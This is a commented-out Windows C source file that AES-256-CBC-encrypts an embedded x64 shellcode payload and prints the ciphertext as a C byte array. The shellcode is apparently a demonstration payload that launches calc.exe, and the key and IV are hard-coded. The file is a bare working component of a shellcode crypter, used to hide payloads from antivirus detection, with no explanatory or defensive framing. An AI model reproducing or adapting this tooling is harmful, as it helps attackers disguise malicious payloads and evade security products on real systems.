//#include "Windows.h"
//#include "bcrypt.h"
//#include "stdio.h"
//#pragma comment(lib, "bcrypt.lib")
//
//#ifndef NT_SUCCESS
//#define NT_SUCCESS(Status) (((NTSTATUS)(Status)) >= 0)
//#endif
//
//typedef struct _AES {
//    PBYTE	pPlainText;         // base address of the plain text data 
//    DWORD	dwPlainSize;        // size of the plain text data
//
//    PBYTE	pCipherText;        // base address of the encrypted data	
//    DWORD	dwCipherSize;       // size of it (this can change from dwPlainSize in case there was padding)
//
//    PBYTE	pKey;               // the 32 byte key
//    PBYTE	pIv;                // the 16 byte iv
//} AES, * PAES;
//
//const unsigned char Payload[] =
//"\xfc\x48\x83\xe4\xf0\xe8\xc0\x00\x00\x00\x41\x51\x41\x50"
//"\x52\x51\x56\x48\x31\xd2\x65\x48\x8b\x52\x60\x48\x8b\x52"
//"\x18\x48\x8b\x52\x20\x48\x8b\x72\x50\x48\x0f\xb7\x4a\x4a"
//"\x4d\x31\xc9\x48\x31\xc0\xac\x3c\x61\x7c\x02\x2c\x20\x41"
//"\xc1\xc9\x0d\x41\x01\xc1\xe2\xed\x52\x41\x51\x48\x8b\x52"
//"\x20\x8b\x42\x3c\x48\x01\xd0\x8b\x80\x88\x00\x00\x00\x48"
//"\x85\xc0\x74\x67\x48\x01\xd0\x50\x8b\x48\x18\x44\x8b\x40"
//"\x20\x49\x01\xd0\xe3\x56\x48\xff\xc9\x41\x8b\x34\x88\x48"
//"\x01\xd6\x4d\x31\xc9\x48\x31\xc0\xac\x41\xc1\xc9\x0d\x41"
//"\x01\xc1\x38\xe0\x75\xf1\x4c\x03\x4c\x24\x08\x45\x39\xd1"
//"\x75\xd8\x58\x44\x8b\x40\x24\x49\x01\xd0\x66\x41\x8b\x0c"
//"\x48\x44\x8b\x40\x1c\x49\x01\xd0\x41\x8b\x04\x88\x48\x01"
//"\xd0\x41\x58\x41\x58\x5e\x59\x5a\x41\x58\x41\x59\x41\x5a"
//"\x48\x83\xec\x20\x41\x52\xff\xe0\x58\x41\x59\x5a\x48\x8b"
//"\x12\xe9\x57\xff\xff\xff\x5d\x48\xba\x01\x00\x00\x00\x00"
//"\x00\x00\x00\x48\x8d\x8d\x01\x01\x00\x00\x41\xba\x31\x8b"
//"\x6f\x87\xff\xd5\xbb\xf0\xb5\xa2\x56\x41\xba\xa6\x95\xbd"
//"\x9d\xff\xd5\x48\x83\xc4\x28\x3c\x06\x7c\x0a\x80\xfb\xe0"
//"\x75\x05\xbb\x47\x13\x72\x6f\x6a\x00\x59\x41\x89\xda\xff"
//"\xd5\x63\x61\x6c\x63\x2e\x65\x78\x65\x00";
//
//// Key and IV for AES-256-CBC
//BYTE Key[32] = {
//    0xed,0x3a,0x02,0xdf,0x37,0xe8,0x63,0x0f,
//    0x4b,0xa0,0x90,0xf0,0xb6,0x9f,0x41,0x1b,
//    0x9c,0xa2,0xcf,0x3c,0x95,0x6b,0xbf,0xb3,
//    0x3a,0x12,0xf5,0x0f,0x99,0x9a,0x42,0xa2 };
//
//BYTE Iv[16] = {
//    0x5b,0x0b,0xa9,0xb9,0x0a,0x5c,0x2b,0x83,
//    0xff,0xf3,0x56,0x19,0xaf,0xb9,0x11,0xfe };
//
//// The encryption implementation
//BOOL InstallAesEncryption(PAES pAes) {
//    BOOL                  bSTATE = TRUE;
//    NTSTATUS              STATUS;
//    BCRYPT_ALG_HANDLE     hAlgorithm = NULL;
//    BCRYPT_KEY_HANDLE     hKeyHandle = NULL;
//
//    ULONG                 cbResult = 0;
//    DWORD                 dwBlockSize = 0;
//    DWORD                 cbKeyObject = 0;
//    PBYTE                 pbKeyObject = NULL;
//    PBYTE                 pbCipherText = NULL;
//    DWORD                 cbCipherText = 0;
//
//    // Initializing "hAlgorithm" as AES algorithm Handle
//    STATUS = BCryptOpenAlgorithmProvider(&hAlgorithm, BCRYPT_AES_ALGORITHM, NULL, 0);
//    if (!NT_SUCCESS(STATUS)) {
//        printf("[!] BCryptOpenAlgorithmProvider Failed With Error: 0x%0.8X \n", STATUS);
//        bSTATE = FALSE; goto _EndOfFunc;
//    }
//
//    // Getting the size of the key object variable pbKeyObject
//    STATUS = BCryptGetProperty(hAlgorithm, BCRYPT_OBJECT_LENGTH, (PBYTE)&cbKeyObject, sizeof(DWORD), &cbResult, 0);
//    if (!NT_SUCCESS(STATUS)) {
//        printf("[!] BCryptGetProperty[1] Failed With Error: 0x%0.8X \n", STATUS);
//        bSTATE = FALSE; goto _EndOfFunc;
//    }
//
//    // Getting the size of the block used in the encryption
//    STATUS = BCryptGetProperty(hAlgorithm, BCRYPT_BLOCK_LENGTH, (PBYTE)&dwBlockSize, sizeof(DWORD), &cbResult, 0);
//    if (!NT_SUCCESS(STATUS)) {
//        printf("[!] BCryptGetProperty[2] Failed With Error: 0x%0.8X \n", STATUS);
//        bSTATE = FALSE; goto _EndOfFunc;
//    }
//
//    // Checking if block size is 16 bytes
//    if (dwBlockSize != 16) {
//        bSTATE = FALSE; goto _EndOfFunc;
//    }
//
//    // Allocating memory for the key object 
//    pbKeyObject = (PBYTE)HeapAlloc(GetProcessHeap(), 0, cbKeyObject);
//    if (pbKeyObject == NULL) {
//        bSTATE = FALSE; goto _EndOfFunc;
//    }
//
//    // Setting Block Cipher Mode to CBC
//    STATUS = BCryptSetProperty(hAlgorithm, BCRYPT_CHAINING_MODE, (PBYTE)BCRYPT_CHAIN_MODE_CBC, sizeof(BCRYPT_CHAIN_MODE_CBC), 0);
//    if (!NT_SUCCESS(STATUS)) {
//        printf("[!] BCryptSetProperty Failed With Error: 0x%0.8X \n", STATUS);
//        bSTATE = FALSE; goto _EndOfFunc;
//    }
//
//    // Generating the key object from the AES key
//    STATUS = BCryptGenerateSymmetricKey(hAlgorithm, &hKeyHandle, pbKeyObject, cbKeyObject, (PBYTE)pAes->pKey, sizeof(Key), 0);
//    if (!NT_SUCCESS(STATUS)) {
//        printf("[!] BCryptGenerateSymmetricKey Failed With Error: 0x%0.8X \n", STATUS);
//        bSTATE = FALSE; goto _EndOfFunc;
//    }
//
//    // First BCryptEncrypt call to retrieve the size of the output buffer
//    STATUS = BCryptEncrypt(hKeyHandle, (PUCHAR)pAes->pPlainText, (ULONG)pAes->dwPlainSize, NULL,
//        pAes->pIv, 16, NULL, 0, &cbCipherText, BCRYPT_BLOCK_PADDING);
//    if (!NT_SUCCESS(STATUS)) {
//        printf("[!] BCryptEncrypt[1] Failed With Error: 0x%0.8X \n", STATUS);
//        bSTATE = FALSE; goto _EndOfFunc;
//    }
//
//    // Allocating enough memory for the output buffer
//    pbCipherText = (PBYTE)HeapAlloc(GetProcessHeap(), 0, cbCipherText);
//    if (pbCipherText == NULL) {
//        bSTATE = FALSE; goto _EndOfFunc;
//    }
//
//    // Second BCryptEncrypt call to actually encrypt
//    STATUS = BCryptEncrypt(hKeyHandle, (PUCHAR)pAes->pPlainText, (ULONG)pAes->dwPlainSize, NULL,
//        pAes->pIv, sizeof(Iv), pbCipherText, cbCipherText, &cbResult, BCRYPT_BLOCK_PADDING);
//    if (!NT_SUCCESS(STATUS)) {
//        printf("[!] BCryptEncrypt[2] Failed With Error: 0x%0.8X \n", STATUS);
//        bSTATE = FALSE; goto _EndOfFunc;
//    }
//
//_EndOfFunc:
//    if (hKeyHandle)
//        BCryptDestroyKey(hKeyHandle);
//    if (hAlgorithm)
//        BCryptCloseAlgorithmProvider(hAlgorithm, 0);
//    if (pbKeyObject)
//        HeapFree(GetProcessHeap(), 0, pbKeyObject);
//    if (!bSTATE && pbCipherText)
//        HeapFree(GetProcessHeap(), 0, pbCipherText);
//    if (pbCipherText != NULL && bSTATE) {
//        pAes->pCipherText = pbCipherText;
//        pAes->dwCipherSize = cbCipherText;
//    }
//    return bSTATE;
//}
//
//// Wrapper function for InstallAesEncryption
//BOOL SimpleEncryption(IN PVOID pPlainTextData, IN DWORD sPlainTextSize, IN PBYTE pKey, IN PBYTE pIv,
//    OUT PVOID* pCipherTextData, OUT DWORD* sCipherTextSize) {
//    if (pPlainTextData == NULL || sPlainTextSize == 0 || pKey == NULL || pIv == NULL)
//        return FALSE;
//
//    AES Aes = {
//        .pKey = pKey,
//        .pIv = pIv,
//        .pPlainText = (PBYTE)pPlainTextData,
//        .dwPlainSize = sPlainTextSize
//    };
//
//    if (!InstallAesEncryption(&Aes)) {
//        return FALSE;
//    }
//
//    *pCipherTextData = Aes.pCipherText;
//    *sCipherTextSize = Aes.dwCipherSize;
//    return TRUE;
//}
//
//int main() {
//    PVOID pCipherTextData = NULL;
//    DWORD sCipherTextSize = 0;
//    SIZE_T payloadSize = sizeof(Payload) - 1;
//
//    if (SimpleEncryption((PVOID)Payload, (DWORD)payloadSize, Key, Iv, &pCipherTextData, &sCipherTextSize)) {
//        for (SIZE_T i = 0; i < sCipherTextSize; i++) {
//            if (i % 16 == 0) {
//                if (i != 0) printf("\"\n");
//                printf("\"");
//            }
//            printf("\\x%02x", ((unsigned char*)pCipherTextData)[i]);
//        }
//        printf("\"\n");
//        HeapFree(GetProcessHeap(), 0, pCipherTextData);
//    }
//    return 0;
//}